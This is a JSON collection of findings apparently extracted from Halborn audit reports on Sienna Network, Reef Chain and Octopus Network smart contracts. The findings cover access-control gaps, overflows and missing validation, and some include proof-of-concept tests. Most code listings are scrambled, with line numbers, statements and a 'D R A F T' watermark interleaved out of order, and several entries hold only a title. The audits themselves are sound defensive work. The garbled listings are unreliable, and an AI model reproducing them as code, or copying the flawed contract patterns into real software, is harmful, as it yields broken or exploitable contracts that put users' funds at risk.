[{"title": "POSSIBILITY TO TRANSFER AN ARBITRARY AMOUNT OF TOKENS OUT OF REWARD POOLS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "POSSIBILITY TO TRANSFER AN ARBITRARY AMOUNT OF TOKENS OUT OF REWARD POOLS", "labels": ["Halborn", "Sienna_Network_Rewards_V3_CosmWasm", "Severity: High"]}, {"title": "INSUFFICIENT ACCESS CONTROL IN MIGRATION FUNCTIONS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "handle_request_migration function in contracts/rewards/migration.rs and handle_export_state function in contracts/rewards/lib.rs do not have ade- quate access controls for migration process, which generates the following consequences:  In handle_request_migration function, previous reward pool address (prev) is not restricted; thus, users can execute any potentially malicious message on behalf of current reward pool.  handle_export_state function verifies the value of can_export_state function before continuing with its execution. However, this latter function entirely ignores sender address, which means that does not exist access control for handle_export_state function. D R A F T { contract_addr : callback_code_hash : prev . code_hash , send : msg : self . wrap_export_msg ( EmigrationHandle :: ExportState ( prev . address , vec! [] , handle_request_migration function does not verify old reward pool address: ContractLink < HumanAddr >) -> StdResult < HandleResponse > Listing 4: contracts/rewards/migration.rs (Line 178) HandleResponse :: default () . msg ( CosmosMsg :: Wasm ( WasmMsg :: Execute 175 fn handle_request_migration (& mut self , env : Env , prev : Code Location: 176 177 { 178 179 180 181 182 183 env . message . sender )) ?, }) ) 19 handle_export_state function verifies the value of can_export_state func- tion (see below) before continuing with its execution: Listing 5: contracts/rewards/lib.rs (Line 177) 179 180 181 182 183 184 185 186 can_export_state function does not verify that address of receiver_link is equal to sender address: -> StdResult < HandleResponse > 174 fn handle_export_state (& mut self , env : & Env , migrant : & HumanAddr ) 175 176 { 177 178 let receiver let mut account = Account :: from_addr ( self , & migrant , env . block = self . can_export_state (& env , & migrant ) ?; . time ) ?; let staked let id ) as AccountSnapshot )) ?; let snapshot = to_binary (&(( = account . staked ; = self . canonize ( migrant . clone () ) ?; migrant . clone () , Auth :: load_vk ( self , id . as_slice () ) ?. map (| vk | vk .0) , staked D R A F T return Err ( StdError :: generic_err (\" This handler must be called as part of a transaction \" )) } // If migration to the caller contract is enabled , // its code hash should be available in storage let id = self . canonize ( env . message . sender . clone () ) ?; let receiver_link : Option < ContractLink < HumanAddr >> = // it must be called by the contract which is receiving the if & env . message . sender == migrant { manually by the user ; migration -> StdResult < ContractLink < HumanAddr >> 71 fn can_export_state (& mut self , env : & Env , migrant : & HumanAddr ) 72 73 { 74 // The ExportState transaction is not meat to be called Listing 6: contracts/rewards/migration.rs (Lines 84,85) 75 76 77 78 79 80 81 82 83 84 85 self . get_ns ( Self :: CAN_MIGRATE_TO , id . as_slice () ) ?; if let Some ( receiver_link ) = receiver_link { Ok ( receiver_link ) 20 86 87 } else { Err ( StdError :: generic_err ( \" Migration to this target is not enabled .\" )) Harden access control for functions mentioned above by verifying the sender address. } 88 89 } Risk Level: Likelihood - 5 Impact - 3 Recommendation: D R A F T Remediation plan: SOLVED: The issue was fixed in the following commits:  20dce5c6a7dfcd983ae2fbc4292b1b58678ae07e  6e9511a5721a38690b02c8fbab1239eea96d0a08. 21 ", "labels": ["Halborn", "Sienna_Network_Rewards_V3_CosmWasm", "Severity: High"]}, {"title": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "PRIVILEGED ADDRESS CAN BE TRANSFERRED WITHOUT CONFIRMATION", "labels": ["Halborn", "Sienna_Network_Rewards_V3_CosmWasm", "Severity: Medium"]}, {"title": "MIGRATION REQUEST FUNCTION DOES NOT VERIFY THAT OLD REWARD POOL IS ENABLED TO MIGRATE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Code Location: 176 177 { 178 179 180 181 182 183 184 } }) ) Risk Level: Listing 10: contracts/rewards/migration.rs 175 fn handle_request_migration (& mut self , env : Env , prev : ContractLink < HumanAddr >) -> StdResult < HandleResponse > HandleResponse :: default () . msg ( CosmosMsg :: Wasm ( WasmMsg :: Execute Likelihood - 1 Impact - 3 24 Verify in handle_request_migration function that the old reward pool is closed (if applicable) and enabled to migrate to a new reward pool (CAN_MIGRATE_TO). Recommendation: Remediation plan:: RISK ACCEPTED: The Sienna.Network team accepted the risk for this finding in favor of being able to run several versions of the contract at the same time. D R A F T 25 ", "labels": ["Halborn", "Sienna_Network_Rewards_V3_CosmWasm", "Severity: Low"]}, {"title": "REWARDS UPDATE IS NOT ENFORCED WHEN CLAIMING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Code Location: According to epoch flow defined, SIENNA tokens are transferred to reward pools in a daily basis. When users call claim function in contract- s/rewards/algo.rs, it does not update rewards for calling user before transferring SIENNA tokens. As a consequence, in the worst scenario, users could claim rewards that are not updated since the previous day. Furthermore, this difference cannot be claimed later because users state, which is used to calculate rewards, is reset after claiming: starting_pool_volume, starting_pool_rewards and volume. D R A F T 628 fn claim (& mut self , core : & mut C) -> StdResult < HandleResponse > { 629 630 631 632 633 634 635 636 637 638 639 640 claim function calls commit_claim function and transfer SIENNA tokens without updating rewards for calling user: self . force_exit ( core ) } else if self . bonding > 0 { Listing 11: contracts/rewards/algo.rs (Lines 638,640) self . commit_claim ( core ) ?; HandleResponse :: default () . msg ( RewardsConfig :: reward_token ( core ) ?. transfer (& self } else if self . total . budget == Amount :: zero () { } else if self . earned == Amount :: zero () { errors :: claim_bonding ( self . bonding ) if self . total . closed . is_some () { errors :: claim_zero_claimable () errors :: claim_pool_empty () } else { 641 642 } . address , self . earned ) ?) ? . log ( \" reward \" , & self . earned . to_string () ) 26 commit_claim function updates the amount claimed without updating rewards for calling user: Listing 12: contracts/rewards/algo.rs (Line 689) Risk Level: } Ok (() ) Recommendation: Likelihood - 1 Impact - 3 if self . earned > Amount :: zero () { 684 fn commit_claim (& mut self , core : & mut C ) -> StdResult <() > { 685 686 687 688 689 690 } self . reset ( core ) ?; self . total . commit_claim ( core , self . earned ) ?; D R A F T NOT APPLICABLE: Sienna.Network team claimed that rpt contract [out of scope for this security audit] distributes a fixed amount of tokens among all reward pools once per 24 hours. So, if someone calls vest function in the middle of that period, it wont do anything. It is recommended to automatically update rewards of calling users before transferring them SIENNA tokens. Remediation plan: 27 ", "labels": ["Halborn", "Sienna_Network_Rewards_V3_CosmWasm", "Severity: Low"]}, {"title": "BONDING PERIOD COULD UNWRAP TO AN INADEQUATE DEFAULT VALUE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "BONDING PERIOD COULD UNWRAP TO AN INADEQUATE DEFAULT VALUE", "labels": ["Halborn", "Sienna_Network_Rewards_V3_CosmWasm", "Severity: Informational"]}, {"title": "FUNCTION TO QUERY LP TOKEN INFO DOES NOT WORK PROPERLY", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/CosmWasm Smart Contract Audits/Sienna_Network_Rewards_V3_CosmWasm_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "FUNCTION TO QUERY LP TOKEN INFO DOES NOT WORK PROPERLY", "labels": ["Halborn", "Sienna_Network_Rewards_V3_CosmWasm", "Severity: Informational"]}, {"title": "INTEGER OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf", "body": "An overflow happens when an arithmetic operation reaches the maximum size of a type. For instance in the ethereum_signable_message() method, if statement is summing up few u32 values which may end up overflowing the integer. In computer programming, an integer overflow occurs when an arithmetic operation attempts to create a numeric value that is outside of the range that can be represented with a given number of bits -- either larger than the maximum or lower than the minimum representable value. Code Location: Listing 1: modules/evm-accounts/src/lib.rs (Lines 182) 180 pub fn ethereum_signable_message ( what : &[ u8 ], extra : &[ u8 ]) -> Vec < u8 > { let prefix = b \" reef evm : \" ; let mut l = prefix . len () + what . len () + extra . len () ; let mut rev = Vec :: new () ; 181 182 183 Listing 2: modules/evm-accounts/src/lib.rs (Lines 313,314) 312 pub fn to_ascii_hex ( data : &[ u8 ]) -> Vec < u8 > { 313 314 let mut r = Vec :: with_capacity ( data . len () * 2) ; let mut push_nibble = | n | r . push ( if n < 10 { b '0 ' + n } else { b 'a ' - 10 + n }) ; Listing 3: modules/evm-bridge/src/lib.rs (Lines 183,186,191) 182 let offset = U256 :: from_big_endian (& output [0..32]) ; 183 let length = U256 :: from_big_endian (& output [ offset . as_usize () .. offset . as_usize () + 32]) ; 184 ensure !( 185 // output is 32 - byte aligned . ensure total_length >= offset + string length + string data length . 13 output . len () >= offset . as_usize () + 32 + length . as_usize () , Error :: <T >:: InvalidReturnValue 186 187 188 ); 189 190 let mut data = Vec :: new () ; 191 data . extend_from_slice (& output [ offset . as_usize () + 32.. offset . as_usize () + 32 + length . as_usize () ]) ; Risk Level: Likelihood - 3 Impact - 3 Recommendations: It is recommended to use vetted safe math libraries for arithmetic oper- ations consistently throughout the smart contract system. Consider re- placing the addition and multiplication operators with Rusts checked_add and checked_mul methods. Remediation: SOLVED: Reef fixed the issue in commit 6e4153498a28d03b8600739709cb200065c88781. 14 ", "labels": ["Halborn", "Reef_Chain_Substrate", "Severity: Medium"]}, {"title": "TOTAL ISSUANCE NOT UPDATED ON MINT", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The update_balance dispatchable defined in modules/currencies/src/lib.rs does not update the total issuance of the currency (identified by user- supplied ID) which is minted to the target address. This may lead to discrepancies in token data. Code Location: Listing 4: modules/currencies/src/lib.rs (Lines 168) 159 #[ pallet :: weight ( T :: WeightInfo :: update_balance_non_native_currency () )] 160 pub fn update_balance ( origin : OriginFor <T >, 161 who : <T :: Lookup as StaticLookup >:: Source , 162 currency_id : CurrencyIdOf <T >, 163 amount : AmountOf <T >, 164 165 ) -> DispatchResultWithPostInfo { ensure_root ( origin ) ?; 166 let dest = T :: Lookup :: lookup ( who ) ?; 167 < Self as MultiCurrencyExtended < T :: AccountId > >:: update_balance ( 168 currency_id , & dest , amount ) ?; 169 170 } Ok (() . into () ) Risk Level: Likelihood - 3 Impact - 3 Recommendations: Total issuance should be updated every time tokens are minted or burned. 15 Remediation Plan: ACKNOWLEDGED: Reef states that the affected function is sudo only and will be deprecated in a future release. 16 ", "labels": ["Halborn", "Reef_Chain_Substrate", "Severity: Medium"]}, {"title": "CASTING OVERFLOW", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf", "body": "When converting or casting between types, an overflow/wrapping may occur and result in logic bugs leading to thread panic. The decode_string utility method defined in modules/evm-bridge/src/lib. rs does not validate if the values of the offset and length variables can be cast to the usize type. Although the method is not exported and available externally, the method is vulnerable still and the risk could increase in the future if the method is used before its patched. Code Location: Listing 5: modules/evm-bridge/src/lib.rs (Lines 183,186,191) 182 let offset = U256 :: from_big_endian (& output [0..32]) ; 183 let length = U256 :: from_big_endian (& output [ offset . as_usize () .. offset . as_usize () + 32]) ; 184 ensure !( 185 // output is 32 - byte aligned . ensure total_length >= offset + string length + string data length . output . len () >= offset . as_usize () + 32 + length . as_usize () , Error :: <T >:: InvalidReturnValue 186 187 188 ); 189 190 let mut data = Vec :: new () ; 191 data . extend_from_slice (& output [ offset . as_usize () + 32.. offset . as_usize () + 32 + length . as_usize () ]) ; Risk Level: Likelihood - 2 Impact - 3 17 Recommendations: Check the value against maximum type value before casting. Listing 6 1 if ( x <= usize :: MAX ) { // logic ... 2 3 } Remediation: SOLVED: Reef fixed the issue in commit 313439bb7940afa0f0d5060fbcbbe26d5a3e5298 18 ", "labels": ["Halborn", "Reef_Chain_Substrate", "Severity: Low"]}, {"title": "SLASH AMOUNT VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The slash_reserved method defined in modules/currencies/src/lib.rs does not validate if the value of the user-supplied value parameter exceeds the actual balance of the account owned by the address that is to have its ERC20 tokens slashed. Code Location: Listing 7: modules/currencies/src/lib.rs (Lines 396) 394 fn slash_reserved ( currency_id : Self :: CurrencyId , who : & T :: AccountId , value : Self :: Balance ) -> Self :: Balance { match currency_id { CurrencyId :: ERC20 ( _) => value , CurrencyId :: Token ( TokenSymbol :: REEF ) = > T :: NativeCurrency :: slash_reserved ( who , value ) , _ => T :: MultiCurrency :: slash_reserved ( currency_id , who , 395 396 397 398 value ) , 399 400 } } Risk Level: Likelihood - 2 Impact - 2 Recommendations: The slashed amount should always be lesser or equal to the account balance that is to be slashed. 19 Remediation: SOLVED: Reef fixed the issue in commit (bd43bec58890be763b32bfdfd18ba85a8c0ef9e5)[https://github.com/reef-defi/reef-chain/pull/37/commits/bd43bec58890be763b32bfdfd18ba85a8c0ef9e5]. 20 ", "labels": ["Halborn", "Reef_Chain_Substrate", "Severity: Low"]}, {"title": "CURRENCY ID VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf", "body": "Many dispatchables and helper methods defined in modules/currencies/src /lib.rs do not check if the user-supplied currency ID matches any of the existing ones before calling the possibly resource-intensive underlying utility functions. Code Location: Listing 8: modules/evm-accounts/src/lib.rs (Lines 125) origin : OriginFor <T >, dest : <T :: Lookup as StaticLookup >:: Source , currency_id : CurrencyIdOf <T >, #[ pallet :: compact ] amount : BalanceOf <T >, 121 #[ pallet :: weight ( T :: WeightInfo :: transfer_non_native_currency () )] 122 pub fn transfer ( 123 124 125 126 127 ) -> DispatchResultWithPostInfo { 128 129 130 let from = ensure_signed ( origin ) ?; let to = T :: Lookup :: lookup ( dest ) ?; < Self as MultiCurrency <T :: AccountId > >:: transfer ( currency_id , & from , & to , amount ) ?; Ok (() . into () ) 131 132 } List of all the functions that fail to validate the currency ID: Listing 9: (Lines 2,3) 1 auditor@halborn :~/ projects / reef / reef - chain / modules / currencies$ \\ 2 > grep - ne ' fn .* CurrencyId ' src / lib . rs \\ 3 > | cut -d ' -' -f 1 4 178: 5 186: 6 199: fn minimum_balance ( currency_id : Self :: CurrencyId ) fn total_issuance ( currency_id : Self :: CurrencyId ) fn total_balance ( currency_id : Self :: CurrencyId , who : & T :: AccountId ) 21 7 217: fn free_balance ( currency_id : Self :: CurrencyId , who : & T :: AccountId ) 8 235: fn ensure_can_withdraw ( currency_id : Self :: CurrencyId , who : & T :: AccountId , amount : Self :: Balance ) 9 290: fn deposit ( currency_id : Self :: CurrencyId , who : & T :: AccountId , amount : Self :: Balance ) 10 303: fn withdraw ( currency_id : Self :: CurrencyId , who : & T :: AccountId , amount : Self :: Balance ) 11 316: fn can_slash ( currency_id : Self :: CurrencyId , who : & T :: AccountId , amount : Self :: Balance ) 12 324: fn slash ( currency_id : Self :: CurrencyId , who : & T :: AccountId , amount : Self :: Balance ) 13 336: fn update_balance ( currency_id : Self :: CurrencyId , who : & T :: AccountId , by_amount : Self :: Amount ) 14 376: fn remove_lock ( lock_id : LockIdentifier , currency_id : Self :: CurrencyId , who : & T :: AccountId ) 15 386: fn can_reserve ( currency_id : Self :: CurrencyId , who : & T :: AccountId , value : Self :: Balance ) 16 394: fn slash_reserved ( currency_id : Self :: CurrencyId , who : & T :: AccountId , value : Self :: Balance ) 17 402: fn reserved_balance ( currency_id : Self :: CurrencyId , who : & T :: AccountId ) 18 423: fn reserve ( currency_id : Self :: CurrencyId , who : & T :: AccountId , value : Self :: Balance ) 19 445: fn unreserve ( currency_id : Self :: CurrencyId , who : & T :: AccountId , value : Self :: Balance ) Risk Level: Likelihood - 2 Impact - 2 Recommendations: It is recommended to validate all user-supplied input in order to avoid executing unnecessary operations and mitigate the risk of resource exhaustion. 22 Remediation Plan: ACKNOWLEDGED: Reef states that there is only 1 currency id in use, and there likely wont be more going forward. 23 ", "labels": ["Halborn", "Reef_Chain_Substrate", "Severity: Low"]}, {"title": "VECTOR CAPACITY VALIDATION MISSING", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/Substrate Audits/Reef_Chain_Substrate_Security_Audit_Report_Halborn_v1_1.pdf", "body": "The to_ascii_hex utility function defined in modules/evm-accounts/src/ lib.rs when creating a new Vec<u8> from the user-supplied data slice with a Vec::with_capacity method does not validate if the capacity of the new vector exceeds the maximum allowed capacity. Code Location: Listing 10: modules/currencies/src/lib.rs (Lines 313) 312 pub fn to_ascii_hex ( data : &[ u8 ]) -> Vec < u8 > { 313 314 let mut r = Vec :: with_capacity ( data . len () * 2) ; let mut push_nibble = | n | r . push ( if n < 10 { b '0 ' + n } else { b 'a ' - 10 + n }) ; for & b in data . iter () { push_nibble ( b / 16) ; push_nibble ( b % 16) ; } r 315 316 317 318 319 320 } Risk Level: Likelihood - 1 Impact - 2 Recommendations: Validate if the new capacity (data.len()* 2) does not exceed isize::MAX bytes. 24 Remediation: SOLVED: Reef fixed the issue in commit (6b826f7ca16d1a30f3fa55f0606d0b94b69b2b3a)[https://github.com/reef-defi/reef-chain/pull/37/commits/6b826f7ca16d1a30f3fa55f0606d0b94b69b2b3a]. 25 FUZZING 26 Introduction: Fuzzing or fuzz testing is an automated software testing technique that involves providing invalid, unexpected, or random data as inputs to a computer program. The program is then monitored for exceptions such as crashes, failing built-in code assertions, or potential memory leaks. Halborn custom-built scripts leverage libFuzzer and cargo-fuzz for in-process, coverage-guided fuzz testing. The fuzzer tracks which areas of the code are reached and generates mutations on the corpus of input data to maximize the code coverage. The code coverage information is provided by LLVMs SanitizerCoverage instrumentation. ", "labels": ["Halborn", "Reef_Chain_Substrate", "Severity: Informational"]}, {"title": "TOKEN PRICE MAINTAINER AS WELL AS RELAYER CAN BE SET TO THE OWNERS ACCOUNTID", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The set_token_price_maintainer_account() and set_relayer_account() meth- ods implemented for the AppchainAnchor struct and can be found in appchain -anchor/src/user_actions/settings_manager.rs do not validate the Accoun- tId passed to them to ensure that no matches that of the owner, allowing a malicious owner to bypass the privilege separation point in this case. Code Location: Listing 1: appchain-anchor/src/user_actions/settings_manager.rs 284 fn set_token_price_maintainer_account (& mut self , account_id :  AccountId ) { 285 286 287 288 289 } self . assert_owner () ; let mut anchor_settings = self . anchor_settings . get () . unwrap () ; anchor_settings . token_price_maintainer_account = account_id ; self . anchor_settings . set (& anchor_settings ); Listing 2: appchain-anchor/src/user_actions/settings_manager.rs 291 fn set_relayer_account (& mut self , account_id : AccountId ) { 292 293 294 295 296 } self . assert_owner () ; let mut anchor_settings = self . anchor_settings . get () . unwrap () ; anchor_settings . relayer_account = account_id ; self . anchor_settings . set (& anchor_settings ); Proof of Concept:: The following test case was created as a PoC: 14 Listing 3 let result = settings_actions :: let total_supply = common :: to_oct_amount ( TOTAL_SUPPLY ); let ( root , _ , _registry , anchor , _) = common :: init ( 1 fn test_set_owner_as_maintainer () { 2 3  total_supply , false ); 4  set_token_price_maintainer_account (& root , & anchor , & root ); 5 6 7 8  anchor ); 9  token_price_maintainer_account ; 10 11 } result . assert_success () ; let result2 = view! ( anchor . get_owner () ); let owner = result2 . unwrap_json :: < String >() ; let anchor_settings = anchor_viewer :: get_anchor_settings (& let maintainer = anchor_settings . assert! ( owner == maintainer ); Risk Level: Likelihood - 1 Impact - 5 Recommendation: The two affected functions must validate that the AccountId passed to them does not match that of the owner and panic otherwise. Remediation Plan: SOLVED: ef2219a37c5be402cec720d9db03501981c2ca80 Octopus Network team The solved the issue in commit 15 ", "labels": ["Halborn", "Octopus_Network_Anchor_NEAR", "Severity: Medium"]}, {"title": "OWNER ACCOUNTID CAN BE SET TO AN INVALID VALUE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The set_owner() method implemented in the AppchainAnchor Struct, which can be found in appchain-anchor/src/lib.rs, does not validate that the AccountId value passed to it actually contains a valid AccountId following the NEARs account ID rules. As a result, an owner who wishes to update pass ownership to another user can erroneously call the function with a string pointing to an invalid NEAR account ID, resulting in complete and irreversible loss of control over the contract from that point forward. Code Location: Listing 4: appchain-anchor/src/lib.rs 398 fn set_owner (& mut self , owner : AccountId ) { 399 400 401 } self . assert_owner () ; self . owner = owner ; Proof of Concept:: The following is a test case developed as a PoC, notice that the test prints Owner is: th!$1$!nv@|!d when finished: Listing 5 let total_supply = common :: to_oct_amount ( TOTAL_SUPPLY ); let ( root , _ , _registry , anchor , _) = common :: init ( anchor . contract . set_owner (\" test \". to_string () ); let result1 = call! ( root , anchor . set_owner (\" th!$_1$_!nv@ | !d \". 1 fn test_set_invalid_owner () { 2 3  total_supply , false ); 4 5  to_string () )); 6 result1 . assert_success () ; 16 let result = view! ( anchor . get_owner () ); println! (\" New owner is : {} \" , result . unwrap_json :: < String >() ); 7 8 9 } Risk Level: Likelihood - 1 Impact - 5 Recommendation: The function must validate that the passed argument is in the form of a valid AccountId before setting the owner. Remediation Plan: SOLVED: ef2219a37c5be402cec720d9db03501981c2ca80 Octopus Network team The solved the issue in commit 17 ", "labels": ["Halborn", "Octopus_Network_Anchor_NEAR", "Severity: Medium"]}, {"title": "LACK OF VALIDATION ALLOWS SETTING PERCENTAGES HIGHER THAN A HUNDRED", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "method change_maximum_validator_stake_percent() The \"appchain- anchor/src/user_actions/settings_manager.rs\" checks that the percentage value passed to it is less than a 100 and reverts otherwise. However, all the remaining functions allowing the owner to change other percentage values do not perform such checks, allowing percentages to exceed 100%, which would probably cause the contract to crash and panic while rewards are being distributed. in Code Location: Listing 6: appchain-anchor/src/user_actions/settings_manager.rs 127 fn change_maximum_market_value_percent_of_near_fungible_tokens (&  mut self , value : u16 ) { 128 129 self . assert_owner () ; let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 130 131 assert! ( value ! = protocol_settings .  maximum_market_value_percent_of_near_fungible_tokens , 132 133 134 \" The value is not changed . \" ); protocol_settings .  maximum_market_value_percent_of_near_fungible_tokens = value ; 135 136 } self . protocol_settings . set (& protocol_settings ); Listing 7: appchain-anchor/src/user_actions/settings_manager.rs 138 fn change_maximum_market_value_percent_of_wrapped_appchain_token (&  mut self , value : u16 ) { 139 self . assert_owner () ; 18 140 let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 141 142 assert! ( value ! = protocol_settings .  maximum_market_value_percent_of_wrapped_appchain_token , 143 144 145 \" The value is not changed . \" ); protocol_settings .  maximum_market_value_percent_of_wrapped_appchain_token = value ; 146 147 } self . protocol_settings . set (& protocol_settings ); Listing 8: appchain-anchor/src/user_actions/settings_manager.rs 229 fn change_validator_commission_percent (& mut self , value : u16 ) { 230 231 self . assert_owner () ; let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 232 233 assert! ( value ! = protocol_settings .  maximum_market_value_percent_of_near_fungible_tokens , 234 235 236 \" The value is not changed . \" ); protocol_settings .  maximum_market_value_percent_of_near_fungible_tokens = value ; 237 238 } self . protocol_settings . set (& protocol_settings ); Risk Level: Likelihood - 1 Impact - 5 Recommendation: Percentage values should always be checked before assigning them to avoid exceeding allowable levels. 19 Remediation Plan: PARTIALLY SOLVED: The Octopus Network team partially solved the issue in commit ef2219a37c5be402cec720d9db03501981c2ca80 Then some checks were removed in commit eaa2a5109bca0522f6a285f53ebe1e366475bbc6 20 ", "labels": ["Halborn", "Octopus_Network_Anchor_NEAR", "Severity: Medium"]}, {"title": "CASE SENSITIVE CHECK ALLOWS ADDING THE SAME NEAR FUNGIBLE TOKEN MORE THAN ONCE", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "function only register_near_fungible_token() The \"appchain- the anchor/src/assets/near_fungible_tokens.rs\" symbol of the token passed to it already exists, however the check is case-sensitive, so it can be bypassed. This allows the owner to register the same token more than once, which can lead to users distributing their funds under different NEAR token contracts instead of one, reducing liquidity and the rewards. in checks if Code Location: Listing 9: appchain-anchor/src/assets/near_fungible_tokens.rs & mut self , symbol : String , name : String , decimals : u8 , contract_account : AccountId , price : U128 , 96 fn register_near_fungible_token ( 97 98 99 100 101 102 103 ) { 104 105 self . assert_owner () ; let mut near_fungible_tokens = self . near_fungible_tokens . get ()  . unwrap () ; 106 107 108 109 110 111 112 113 114 115 assert! ( !near_fungible_tokens . contains (& symbol ) , \" Token '{} ' is already registered . \" , & symbol ); near_fungible_tokens . insert (& NearFungibleToken { metadata : FungibleTokenMetadata { spec : \"ft -1.0.0 \" . to_string () , symbol , name , 21 116 117 118 119 120 121 122 123 124 125 126 127 } decimals , icon : None , reference : None , reference_hash : None , }, contract_account , price_in_usd : price , locked_balance : U128 :: from (0) , bridging_state : BridgingState :: Active , }) ; self . near_fungible_tokens . set (& near_fungible_tokens ); Proof of Concept:: The following test case reproduces the issue and prints the two tokens that were registered with similar names: Listing 10 let total_supply = common :: to_oct_amount ( TOTAL_SUPPLY ); let ( root , _ , _registry , anchor , _) = common :: init ( 1 #[ test ] 2 fn test_same_token_registeration () { 3 4  total_supply , false ); 5 6 7 8 9 10 11 12 13 14 15 16 17 18  , token . metadata . symbol ); 19 20 } }) ; let result = call! ( root , anchor . register_near_fungible_token ( \" HLB \". to_string () , \" Halborn \". to_string () , 2, \" test1 \" . to_string () , U128 :: from (1) )); result . assert_success () ; let result = call! ( root , anchor . register_near_fungible_token ( \" hlb \". to_string () , \" halborn \". to_string () , 2, \" test2 \" . to_string () , U128 :: from (5) )); result . assert_success () ; let result2 = view! ( anchor . get_near_fungible_tokens () ); let tokens = result2 . unwrap_json :: < Vec < NearFungibleToken > >() ; tokens . iter () . for_each (| token |{ println! ( \" Token name : {} , symbol : {} \" , token . metadata . name 22 Risk Level: Likelihood - 3 Impact - 3 Recommendation: The function must validate that the passed token name is not the same as any of the existing tokens before adding it. Remediation Plan: SOLVED: ef2219a37c5be402cec720d9db03501981c2ca80 Octopus Network team The solved the issue in commit 23 ", "labels": ["Halborn", "Octopus_Network_Anchor_NEAR", "Severity: Medium"]}, {"title": "MISSING ZERO CHECKS ON AMOUNTS AND PRICES", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "Checks should be implemented on amount and price values to make sure they are not set to invalid values, including setting such fields to zero. The set_price_of_oct_token() method implemented in the AppchainAnchor struct in \"appchain-anchor/src/lib.rs\" does not employ such checks to validate that the price of the OCT token does not drop to 0. Code Location: Listing 11: appchain-anchor/src/lib.rs let anchor_settings = self . anchor_settings . get () . unwrap () ; assert_eq! ( env :: predecessor_account_id () , anchor_settings . token_price_maintainer_account , \" Only '{} ' can call this function . \" , anchor_settings . token_price_maintainer_account 371 pub fn set_price_of_oct_token (& mut self , price : U128 ) { 372 373 374 375 376 377 378 379 380 381 382 } ); let mut oct_token = self . oct_token . get () . unwrap () ; oct_token . price_in_usd = price ; self . oct_token . set (& oct_token ); Risk Level: Likelihood - 2 Impact - 4 24 Recommendation: A default minimum amount must be checked before setting the price value passed to the function. Remediation Plan: NOT APPLICABLE: The Octopus Network team marked the issue as not appli- cable, as setting OCT to 0 is needed to remove the cross-chain asset transfer restriction. 25 ", "labels": ["Halborn", "Octopus_Network_Anchor_NEAR", "Severity: Medium"]}, {"title": "LACK OF UPPER LIMIT CHECKS ALLOWS BLOCKING WITHDRAWALS", "html_url": "https://github.com/HalbornSecurity/PublicReports/tree/master/NEAR Smart Contract Audits/Octopus_Network_Anchor_NEAR_Smart_Contract_Security_Audit_Report_Halborn_Final.pdf", "body": "The change_unlock_period_of_delegator_deposit() and change_unlock_period_of_validator_deposit () functions in \"appchain-anchor/src/user_actions/settings_manager.rs\" do not check for an upper bound for the values passed to them. These functions allow the owner to set the number of days before validators/delegators can withdraw their rewards. By not checking for an upper bound, the owner can set the values to big numbers that would correspond to years before validators/delegators can actually withdraw their balances. Code Location: Listing 12: appchain-anchor/src/user_actions/settings_manager.rs 193 fn change_unlock_period_of_delegator_deposit (& mut self , value : U64  ) { 194 195 self . assert_owner () ; let mut protocol_settings = self . protocol_settings . get () .  unwrap () ; 196 197 assert! ( value .0 ! = protocol_settings .  unlock_period_of_delegator_deposit .0 , 198 199 200 201 202 } \" The value is not changed . \" ); protocol_settings . unlock_period_of_delegator_deposit = value ; self . 